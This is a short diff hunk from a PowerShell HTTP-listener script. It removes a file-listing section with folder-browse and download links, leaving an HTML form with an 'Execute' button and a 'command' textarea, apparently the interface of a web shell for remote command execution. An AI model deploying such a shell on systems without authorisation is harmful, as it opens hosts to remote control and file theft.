@@ -103,17 +103,6 @@ while ($httpsrvlsnr.IsListening) {
             $html += "<input type='submit' value='Execute'>"
             $html += "<textarea name='command' rows='10' cols='80'></textarea><br>"
             $html += "</form></ul>"
-            $html += "<h1>File Listing</h1><ul>"
-            $files = Get-ChildItem -Path $PWD.Path -Force
-            foreach ($file in $files) {
-                $fileUrl = $file.FullName -replace [regex]::Escape($PWD.Path), ''
-                if ($file.PSIsContainer) {
-                    $html += "<li><a href='/browse$fileUrl'><button>Open Folder</button></a><a> $file</a></li>"
-                } else {
-                    $html += "<li><a href='/download$fileUrl'><button>Download</button></a><a> $file</a></li>"
-                }
-            }
-            $html += "</ul><hr>"
             $html += "</body></html>"
             $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
             $ctx.Response.ContentLength64 = $buffer.Length;
